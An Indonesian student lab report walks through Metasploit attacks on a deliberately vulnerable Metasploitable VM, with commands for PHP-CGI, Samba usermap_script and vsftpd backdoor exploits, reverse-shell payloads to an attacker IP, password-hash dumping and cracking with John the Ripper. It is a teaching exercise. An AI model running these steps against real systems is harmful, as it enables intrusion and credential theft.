# Tugas 5 - Penetration Testing Metasploit
##### *PKSJ Kelompok 8:*
- *Muhammad Faiez Ananda (5113100055)*
- *Ade Ilham Fajri (5113100058)*
- *Muhammad Divi Jaya N (5113100066)*

---

## Pendahuluan
Beberapa perusahaan atau organisasi pasti menyimpan data-data sensitif (seperti password user, kode PIN, dll.) di sistemnya. Tentu saja perusahaan tersebut tidak ingin sistemnya dibobol oleh orang-orang yang tidak bertanggung jawab yang kemudian bisa mengambil alih kontrol sistem dan menimbulkan kerugian yang sangat besar. Oleh karena alasan itu, biasanya perusahaan atau organisasi menginvestasikan dana untuk memperkuat sistemnya. Salah satu metode paling efektif adalah melakukan penetration testing. Dengan melakukan penetration testing, celah-celah keamanan yang ada dapat diketahui dan dengan demikian dapat diperbaiki sebelum ada penyerang yang memanfaatkan celah tersebut. Seorang penetration terser mensimulasikan serangan yang dapat dilakukan, menjelaskan resiko yang bisa terjadi, dan melakukan perbaikan sistem tanpa merusak infrastruktur sistem perusahaan atau organisasi tersebut.

Penetration testing (disingkat pentest) adalah suatu kegiatan dimana seseorang mencoba mensimulasikan serangan yang bisa dilakukan terhadap jaringan perusahaan atau organisasi tertentu untuk menemukan kelemahan yang ada pada sistem jaringan tersebut. Orang yang melakukan kegiatan ini disebut penetration tester (disingkat pentester).

Salah satu tools yang umum digunakan untuk penetration testing adalah Metasploit. Maka dari itu, disini kami akan mencoba melakukan penetration testing menggunakan Metasploit dengan beberapa exploit yang ada ke sebuah virtual machine Metasploitable yang memang dirancang untuk rentan terhadap penetrasi.

---

## Dasar Teori

### *Metasploit*
Metasploit adalah sebuah penetration tool yang cukup powerful untuk melakukan penestrasi kedalam sebuah sistem. Metasploit bisa juga dikatakan sebagai sebuah platform pengembangan untuk membuat security tools dan exploit. Metasploit ini biasanya digunakan oleh profesional keamanan jaringan untuk melakukan tes penetrasi. Metasploit menyerang dengan cara mengirimkan exploit yang berisi payload yang sudah ditentukan oleh penyerang sistem pada komputer korban. Metaspoit ditulis dalam bahasa pemrograman Ruby.

### *Metasploitable*
Metasploitable adalah sebuah Linux virtual machine yang memang secara sengaja dibuat untuk memiliki vulnerable terhadap serangan. Virtual machine ini bisa digunakan untuk melakukan security training, sebagai test security tools, dan bisa juga untuk mempraktikkan teknik penetration testing yang umum.
 
### *Nmap*
Nmap (atau "Network Mapper") adalah sebuah program open source yang berguna untuk mengesksplorasi jaringan. Nmap didesain untuk dapat melakukan scan jaringan yang besar, juga dapat digunakan untuk melakukan scan host tunggal. Nmap menggunakan paket IP untuk menentukan host-host yang aktif dalam suatu jaringan, port-port yang terbuka, sistem operasi yang dipunyai, tipe firewall yang dipakai, dll. 

### *OpenVAS*
OpenVAS (Open Vulnerability Assessment System) merupakan alat bantu yang banyak digunakan untuk mencari celah keamanan dan menguji keamanan sebuah sistem. OpenVAS masih satu keluarga dengan Nessus (tools yang juga banyak digunakan untuk melakukan scanning pada web). Namun, yangmembedakan antara keduanya adalah OpemVAS ini merupakan tools open source. Fitur-fiter yang disediakan oleh OpenVAS antara lain bisa melakukan scanning beberapa target secara paralel, support SSL, support WMI, dan juga Greenbone yang menjadi GUI dari OpenVAS ini.

### *John The Ripper*
John The Ripper adalah suatu cracker password yang cepat yang tersedia pada banyak platfom, antara lain UNIX, Windows, DOS, BeOS dan OpenVMS. Tujuan utama dari John The Ripper adalah untuk mendeteksi kelemahan password pada sistem UNIX (termasuk Linux). John The Ripper merupakan program yang dapat membantu administrator menentukan kelayakan suatu password. Namun, John The Ripper juga digunakan oleh pihak-pihak yang tidak berkepentigan untuk mendapatkan password seorang user.

---

## Penjelasan Instalasi

### *Metasploit*
1. Jika Anda menggunakan Kali Linux, di dalamnya telah tersedia tool Metaploit. Cara membukanya adalah dengan klik tulisan `Applications` di pojok kiri atas.
2. Pilih `8 - Exploitation Tools`. Kemudian pilih `Metasploit Framework`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploit/1.PNG?raw=true)
</p>
3. Setelah Anda membuka tool tersebut, maka secara otomatis Anda akan membuka sebuah Terminal yang di dalamnya terdapat sebuah msfconsole.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploit/2.PNG?raw=true)
</p>

### *Metasploitable*
1. Pertama-tama kita unduh dahulu file Metasploitable, file bisa di unduh di sini : [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download]
2. Ekstrak file yang telah kita unduh.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/1.PNG?raw=true)
</p>
3. Pada Virtual Box, kita pilih untuk membuat Baru.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/2.PNG?raw=true)
</p>
4. Berikan nama sesuai keinginan Anda, pilih tipenya yaitu *Linux* dan versinya *Ubuntu (32-bit)*.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/3.PNG?raw=true)
</p>
5. Alokasikan memori (RAM) sesuai kebutuhan (512 MB sudah dapat berjalan dengan baik).
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/4.PNG?raw=true)
</p>
6. Pilih menu ketiga yaitu *Gunakan berkas hard disk virtual yang ada*, kemudian pilih icon kecil di sebelah kanan.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/5.PNG?raw=true)
</p>
7. Pilih file *Metasploitable.vmdk*.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/6.PNG?raw=true)
</p>
8. Jika sudah, jalankan Metasploitable dan masukkan username dan password (default username / password = msfadmin).
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Metasploitable/7.PNG?raw=true)
</p>

### *Nmap*
1. Nmap adalah salah satu tool yang sudah tersedia di dalam Kali Linux. Jika Anda ingin mengetahui apakah di dalam OS Anda telah tersedia Nmap atau belum, Anda dapat membuka terminal dan memasukkan perintah `nmap`. Tampilan akan berganti seperti di bawah ini apabila Anda telah menginstall Nmap.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Install%20Nmap/1.PNG?raw=true)
</p>

---

## Penetration Testing

### Exploit : php_cgi_arg_injection, Post Exploitation : enum_system
1. Penjelasan exploit php_cgi_arg_injection dapat dilihat pada [https://pentesterlab.com/exercises/cve-2012-1823/course]
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/1.PNG?raw=true)
</p>
2. Vulnerability yang akan kita coba bobol kali ini akan menggunakan exploit yaitu php_cgi_arg_injection. Setelah membuka msfconsole, kita dapat memasukkan perintah `use exploit/multi/http/php_cgi_arg_injection`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/2.PNG?raw=true)
</p>
3. Masukkan IP alamat target yang akan diserang dengan memasukkan `set RHOST [IP_TARGET]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/3.PNG?raw=true)
</p>
4. Payload yang akan kita gunakan adalah reverse_tcp, `set PAYLOAD php/meterpreter/reverse_tcp`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/4.PNG?raw=true)
</p>
5. Masukkan IP alamat penyerang, `set LHOST [IP_ATTACKER]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/5.PNG?raw=true)
</p>
6. Untuk melihat status dapat dilakukan dengan `show options`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/6.PNG?raw=true)
</p>
7. Setelah kita masuk di meterpreter, kita dapa melihat list file dengan memasukkan `ls`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/7.PNG?raw=true)
</p>
8. Untuk mengetahui id/username dari session kita, masukkan `getuid`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/8.PNG?raw=true)
</p>
9. Untuk mendapatkan informasi dari komputer, masukkan `sysinfo`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/9.PNG?raw=true)
</p>
10. Untuk melakukan Post Exploitation, tekan ctrl+Z dan pilih `y`.
11. Post Exploitation yang akan kita jalankan adalah enum_system, yaitu untuk mendapatkan informasi dari sistem target. Masukkan `use post/linux/gather/enum_system`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/10.PNG?raw=true)
</p>
12. Set session sesuai ID session yang terbuka, `set SESSION [SESSION_ID]`.
13. Jalankan exploit dengan perintah `run`. Maka akan mendapatkan info seperti di bawah ini (karena session yang terbuka bukanlah root, jadi yang bisa kita dapatkan hanya sebatas informasi-informasi seperti OS).
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/PHP%20CGI/11.PNG?raw=true)
</p>

### Exploit : usermap_script, Post Exploitation : hashdump
1. Vulnerability kedua yang akan kita coba bobol kali ini akan menggunakan exploit usermap_script (SAMBA). Masukkan perintah `use exploit/multi/samba/usermap_script`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/1.PNG?raw=true)
</p>
2. Masukkan `show payloads` untuk melihat payload apa saja yang dapat kita gunakan.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/2.PNG?raw=true)
</p>
3. Payload yang akan kita gunakan adalah `cmd/unix/reverse`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/3.PNG?raw=true)
</p>
4. Masukkan perintah `set PAYLOAD cmd/unix/reverse`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/4.PNG?raw=true)
</p>
5. Masukkan IP target dengan `set RHOST [IP_TARGET]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/5.PNG?raw=true)
</p>
6. Masukkan port target yang akan kita buka, `set RPORT 445`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/6.PNG?raw=true)
</p>
7. Masukkan IP penyerang dengan `set LHOST [IP_ATTACKER]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/7.PNG?raw=true)
</p>
8. Jalankan exploit dengan `exploit`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/8.PNG?raw=true)
</p>
9. Jika sudah kita jalankan dan berhasil, tandanya seperti di bawah ini.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/9.PNG?raw=true)
</p>
10. Berikut ini contoh-contoh perintah yang dapat kita masukkan.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/10.PNG?raw=true)
</p>
11. Tekan ctrl+Z dan pilih `y`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/11.PNG?raw=true)
</p>
12. Untuk melihat daftar session yang terbuka dapat kita lakukan dengan `sessions -l`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/12.PNG?raw=true)
</p>
13. Kali ini kita akan melakukan Post Exploitation yang bernama hashdump untuk mendapatkan database. Masukkan perintah `use post/linux/gather/hashdump`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/13.PNG?raw=true)
</p>
14. Set session yang terbuka, `set SESSION [ID_SESSION]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/14.PNG?raw=true)
</p>
15. Jalankan exploit dengan memasukkan `exploit`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/15.PNG?raw=true)
</p>
16. Databse berupa usernam password yang berhasil kita dapatkan telah di enkripsi. Untuk itu kita perlu melakukan *dictionary attack* dengan bantuan tool lain yaitu *John The Ripper*. Pertama masuklah ke direktori `/usr/sbin`. Jalan kan file john ddengan perintah `./john [ALAMAT_FILE_DUMP]`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/Samba%20usermap_script/16.PNG?raw=true)
</p>

### Exploit : vsftpd_234_backdoor, Post Exploitation : enum_configs
1. Pertama-tama kita scan dulu vulnerability dengan mengunakan nmap.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/1.PNG?raw=true)
</p>
2. Lalu kita search apakah ada exploit vsftpd.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/2.PNG?raw=true)
</p>
3. Sekarang kita gunakan exploit vsftpd_234_backdoor.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/3.PNG?raw=true)
</p>
4. Set IP Target (RHOST), agar aman LHOST (IP Penyerang) juga diatur.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/4.PNG?raw=true)
</p>
5. Set payload yang akan kita gunakan (di sini menggunakan cmd/unix/interact).
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/5.PNG?raw=true)
</p>
6. Jalankan exploit.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/6.PNG?raw=true)
</p>
7. Tekan ctrl + Z dan pilih `y`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/7.PNG?raw=true)
</p>
8. Cek session dengan `sessions -l`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/8.PNG?raw=true)
</p>
9. Lakukan Post Exploitation enum_configs untuk mendapatkan file-file konfigurasi yang ada pada komputer target. Lalu set SESSION sesuai ID Session yang telah terbuka.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/9.PNG?raw=true)
</p>
10. Jalankan post exploit dengan perintah `run`.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/10.PNG?raw=true)
</p>
11. Maka akan muncul seperti di bawah ini.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/11.PNG?raw=true)
</p>
12. Buka salah satu file yang berhasil diambil.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/12.PNG?raw=true)
</p>
13. Ini salah satu isi file pada konfigurasi apache.
<p align="center">
![alt text](https://github.com/adeilhamfajri/PKSJ_Gokilz/blob/master/Dokumentasi/Tugas%205%20-%20Penetration%20Testing%20(Metasploit)/Penetration/VSFTPD/13.PNG?raw=true)
</p>

## Kesimpulan dan Saran

### *Kesimpulan*
1. Exploit yang paling populer untuk melakukan penetrasi adalah metode Reverse Proxy (Reverse TCP).
2. Malicious code sering disipkan dalam sebuah file untuk melakukan eksploitasi komputer target.

### *Saran*
1. Disarankan untuk menggunakan Kali Linux karena di dalamnya telah tersedia tools untuk melakukan exploit seperti Metasploit, Armitage dll.
2. Disarankan untuk lebih berhati-hati jika akan membuka file yang mencurigakan, karena dalam file-file tersebut sering terdapat malicious code yang dapat membuka celah keamanan komputer.